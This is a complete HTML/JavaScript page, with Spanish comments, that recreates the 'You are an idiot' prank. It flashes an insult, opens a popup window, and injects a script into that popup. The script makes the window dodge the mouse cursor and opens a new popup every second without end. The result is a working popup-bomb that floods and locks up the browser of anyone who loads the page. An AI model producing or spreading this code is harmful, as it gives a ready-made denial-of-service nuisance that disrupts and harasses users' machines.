<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: yellow;
      font-family: Arial, sans-serif;
      text-align: center;
      font-size: 3rem;
      font-weight: bold;
      animation: blink 0.5s infinite alternate;
    }
    @keyframes blink {
      from { opacity: 1; }
      to { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <div>You are an idiot!</div>
  
  <script>
    function abrirNuevaVentana() {
      const videoSource = 'tu_video.mp4';
      const windowWidth = window.innerWidth;
      const windowHeight = window.innerHeight;
      const randomX = Math.floor(Math.random() * (windowWidth - 400));
      const randomY = Math.floor(Math.random() * (windowHeight - 300));

      const nuevaVentana = window.open('', '_blank', `width=400,height=300,left=${randomX},top=${randomY}`);

      if (nuevaVentana) {
        nuevaVentana.document.write(`
          <html>
            <head>
              <title>You are an idiot</title>
              <style>
                body { margin: 0; background-color: black; display: flex; align-items: center; justify-content: center; }
                video { width: 100%; height: 100%; outline: none; }
              </style>
            </head>
            <body>
              <video autoplay loop muted>
                <source src="${videoSource}" type="video/mp4">
                Tu navegador no soporta la reproducción de video.
              </video>
              <script>
                // Función para hacer que la ventana "huya" del ratón
                document.addEventListener('mousemove', (event) => {
                  const windowX = window.screenX;
                  const windowY = window.screenY;
                  const distance = 150;

                  if (Math.abs(event.screenX - windowX) < distance && Math.abs(event.screenY - windowY) < distance) {
                    const newX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
                    const newY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
                    window.moveTo(newX, newY);
                  }
                });

                // Función recursiva para abrir nuevas ventanas desde cada ventana emergente
                function abrirVentanasRecursivamente() {
                  setInterval(() => {
                    const win = window.open('', '_blank', 'width=400,height=300');
                    if (win) {
                      win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
                      win.blur();
                    }
                  }, 1000);
                }
                abrirVentanasRecursivamente();
              <\/script>
            </body>
          </html>
        `);
        nuevaVentana.document.close();
      }
    }

    // Comienza el ciclo de ventanas en la página principal
    abrirNuevaVentana();
  </script>
</body>
</html>
